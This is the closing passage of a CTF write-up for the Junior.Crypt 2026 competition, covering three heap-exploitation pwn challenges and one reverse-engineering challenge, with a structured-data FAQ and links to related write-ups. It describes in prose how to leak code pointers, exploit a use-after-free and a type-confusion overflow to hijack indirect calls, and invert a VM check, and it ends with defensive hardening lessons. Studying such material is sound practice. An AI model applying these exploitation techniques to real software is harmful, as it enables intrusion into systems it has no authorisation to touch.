Every step is reversible over uint32. For each record: `before_add = wanted - (0x9e3779b9 XOR (i * 0x45d9f3b))`, `after_xor = ror32(before_add, rotation)`, `character = (previous_state XOR after_xor) - salt`. Iterate from `state = 0xC0DEC0DE` to recover all 51 input bytes.

### What's the broader lesson from the Junior.Crypt 2026 pwn track?

All three pwn challenges reach a hidden flag function through a controlled indirect call, and none of them touches the stack. Each exploit is (leak a live code pointer + write to something that gets dereferenced-as-code). The mitigation stack (PIE, NX, canary, RELRO) does nothing against heap-only exploits that never overflow a stack buffer. Modern hardening has to include: separated freelists per allocation type; nulled-at-source dangling references; strict corroboration between type tags and allocation sizes; and pointer-integrity primitives that don't share their key material with the pointers they protect. Anything short of that leaves the "leak + write = call" pattern trivially reachable.

### Where can I find the solver scripts?

Per-challenge READMEs and pure-stdlib Python solvers are at [Abdelkad3r/Junior.Crypt.2026-CTF](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF). Each challenge has a `solve.py` that reproduces the flag against a fresh instance (for pwn) or from the handout (for reverse). The reverse solver additionally supports `--elf ./checker` to compute the relocation key directly from a compiled binary if you'd rather run the intended build than trust the hardcoded reference key.

## Closing notes

Four challenges, four different shapes of "leak, then write, then call." Clockwork Vault gates hidden slots behind a signed-compare bounds check and lets a single missing negative-index rejection expose both the encoding cookie and the encoded pointer it protects. House of Mirage recycles freed-session chunks into a sink freelist without nulling the session-table pointer, so a stale session and a live sink alias; one `mirror import` writes the sink's vtable through the stale session pointer, and `flush sink` calls the flag function through a fake vtable planted inside the same object. Museum of Echoes reclassifies a small whisper as a large chorus without realloc, and the rewrite handler trusts the tag and overflows the small allocation into the next exhibit's routine pointer. Write The "Кодэ" wraps a byte-by-byte reversible VM check in a modified-compiler injection scheme whose encryption key comes from the compiled ELF's relocation table.

For more pwn-track material, the [TraceBash CTF 2026 pwn writeup](/ctf-writeups/tracebash-ctf-2026-pwn-writeup/) covers badchars-clean ROP with PTY literal-next quoting and format-string %hn writes to stack shellcode. The [LYKNCTF pwn writeup](/ctf-writeups/lyknctf-2026-pwn-writeup/) walks the same "leak → write → call" pattern up to a full off-by-one UAF chain through glibc 2.39 safe-linking + two-entry tcache poisoning. The [SEKAI CTF master writeup](/ctf-writeups/sekai-ctf-2026-writeup/) includes the `ppp` challenge (AFC heap overflow + tcache poisoning → `puts@GOT → system`). For reverse-track material, the [LYKNCTF crack writeup](/ctf-writeups/lyknctf-2026-crack-writeup/) covers nine RE challenges including ARX VMs seeded with `0x9E3779B9`, control-flow-flattened silent-taint checkers, and PyInstaller multi-stage packers. The [R3CTF 2026 master writeup](/ctf-writeups/r3ctf-2026-writeup/) walks the Blinky MIPS64r6 pointer-authentication defeat via a Spectre-style speculative PAC-gated load. The [NoHackNoCTF 2026 master writeup](/ctf-writeups/nohacknoctf-2026-writeup/) has the Talking to the Sun ECDSA nonce-prefix HNP that rhymes structurally with the "recover an encoding key from a shared side channel" pattern here. Full [CTF writeups index](/ctf-writeups/) for everything else.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is Junior.Crypt 2026?","acceptedAnswer": {"@type": "Answer","text": "Junior.Crypt is a Belarusian junior-tier CTF (hosted in Grodno; flag prefix grodno{...}). The 2026 edition ran categories including crypto, forensic, misc, osint, pwn, reverse, and web. This writeup covers the three pwn challenges (Clockwork Vault, House of Mirage, Museum of Echoes) and the one reverse challenge (Write The Кодэ) that I solved. Per-challenge READMEs, handout binaries, and pure-stdlib Python solvers are mirrored at github.com/Abdelkad3r/Junior.Crypt.2026-CTF."}},
    {"@type": "Question","name": "How does Clockwork Vault leak the service cookie without smashing anything?","acceptedAnswer": {"@type": "Answer","text": "inspect_slot() and retune_slot() compute slots[(idx + 2) * 0x20] and only reject idx > 7. Signed compare (jle) lets negative idx through. inspect(-2) reaches slots[0] (hidden service-key slot), whose setting field is exactly the process-local service_cookie. Inspecting any visible mechanism leaks service_cookie XOR trigger_alarm, so XOR-decoding gives a known function address. retune(-1, magic, cookie XOR open_vault) writes the maintenance slot; option 3 (cycle) decodes and calls it."}},
    {"@type": "Question","name": "Why does the House of Mirage exploit not need a stack overflow?","acceptedAnswer": {"@type": "Answer","text": "The exploit lives entirely in the heap. Sessions and sinks share an allocation size class; expired sessions land on an archive freelist but their session-table pointer stays live. A new sink pulls from that freelist and reuses the archived session chunk, so session_table[i] and sink_table[j] alias. show session leaks the sink's vtable pointer (PIE base). mirror import session profile writes 0x60 bytes through the stale session pointer, rewriting the sink's vtable to point at a fake vtable planted inside the same object. flush sink dispatches into the hidden flag routine."}},
    {"@type": "Question","name": "What is the archive race in House of Mirage and how do you beat it?","acceptedAnswer": {"@type": "Answer","text": "After the archived session's chunk is reused as a sink, the background archive-sweep thread can still see the stale session-table pointer and try to archive the object again. If that happens between the leak and the write, the object's first qword becomes 0xa5a5a5a5a5a5a5a5 and both fail. Beat it by pipelining the critical operations in one send(): create-sink → show-session (leak vtable) → re-arm-session-far-in-future. The re-arm pushes the next archive candidacy out to 9999 seconds."}},
    {"@type": "Question","name": "What is the reclassify-without-realloc bug in Museum of Echoes?","acceptedAnswer": {"@type": "Answer","text": "whisper is a 0x50-byte object (kind=1); chorus is a 0xb0-byte object (kind=2). reclassify_exhibit() changes the kind field and routine pointer but doesn't reallocate. rewrite_exhibit() trusts the kind field: for kind=2 it writes 0x1f bytes at +0x30 and 0x5f bytes at +0x50. A whisper reclassified to chorus accepts the 0x5f-byte write at +0x50, or 0xf bytes past its own 0x50-byte allocation. That overflow lands in the adjacent chunk's malloc metadata + slot 1's fields (gate, routine). Set slot 1's gate = 0x4543484f and routine = grand_finale; slot 1's perform calls the hidden flag function."}},
    {"@type": "Question","name": "How did you find grand_finale's exact address on the live service?","acceptedAnswer": {"@type": "Answer","text": "The handout and remote had slightly different offsets between adjacent functions. inspect_exhibit on a live chorus leaks chorus_perform; local calibration on the handout confirmed grand_finale = chorus_perform + 0x3d on the deployed instance. General technique: leak any live code pointer, reason about relative offsets rather than absolute addresses, use local calibration to narrow the search space, probe if needed."}},
    {"@type": "Question","name": "How does the modified TCC compiler inject the hidden audit function?","acceptedAnswer": {"@type": "Answer","text": "The provided tcc is a statically-linked stripped ELF. strings tcc surfaces checker.c and audit references that shouldn't be in any compiler. Around the audit reference, a complete C source file is embedded (5884 bytes), containing static volatile unsigned char vm_blob[512] plus the full audit() and relocation_key() implementations. When tcc is invoked with the challenge checker.c, it recognises the file and splices this hidden source into the translation unit as if it were an implicitly-linked library, satisfying the extern int audit(const char *) reference at link time."}},
    {"@type": "Question","name": "What is the ELF relocation key in Write The Кодэ?","acceptedAnswer": {"@type": "Answer","text": "The hidden verifier's relocation_key() opens /proc/self/exe, walks all SHT_RELA sections, folds each Elf64_Rela record into a 64-bit key seeded at SHA-256 IV word 0x6a09e667f3bcc909. Each record adds r_info + 0x9e3779b97f4a7c15 + (section_idx << 32) + rela_idx, rotates left by 17, multiplies by 0xbf58476d1ce4e5b9, and XORs in r_addend. The key is a deterministic function of the final ELF's relocation order. A naive read of the tcc binary sees vm_blob as encrypted bytes; only compiling checker.c and running it (or reproducing the walk offline) yields the key 0xe168ed20290a5b17."}},
    {"@type": "Question","name": "How does the per-byte VM check invert?","acceptedAnswer": {"@type": "Answer","text": "Decrypted vm_blob starts with header 33 00 51 = 51 input bytes, magic 0x51, followed by 51 records a7 salt rotation wanted_state_le32. The verifier iterates: state ^= input[i] + salt; state = rol32(state, rotation); state += 0x9e3779b9 XOR (i * 0x45d9f3b); require state == wanted. Every step is reversible over uint32. For each record: before_add = wanted - (0x9e3779b9 XOR (i * 0x45d9f3b)); after_xor = ror32(before_add, rotation); character = (previous_state XOR after_xor) - salt. Iterate from state = 0xC0DEC0DE."}},
    {"@type": "Question","name": "What's the broader lesson from the Junior.Crypt 2026 pwn track?","acceptedAnswer": {"@type": "Answer","text": "All three pwn challenges reach a hidden flag function through a controlled indirect call, and none of them touches the stack. Each exploit is leak-live-code-pointer + write-to-something-dereferenced-as-code. PIE, NX, canary, RELRO do nothing against heap-only exploits that never overflow a stack buffer. Modern hardening has to include: separated freelists per allocation type; nulled-at-source dangling references; strict corroboration between type tags and allocation sizes; and pointer-integrity primitives that don't share their key material with the pointers they protect."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs and pure-stdlib Python solvers are at github.com/Abdelkad3r/Junior.Crypt.2026-CTF. Each challenge has a solve.py that reproduces the flag against a fresh instance (for pwn) or from the handout (for reverse). The reverse solver additionally supports --elf ./checker to compute the relocation key directly from a compiled binary."}}
  ]
}
</script>
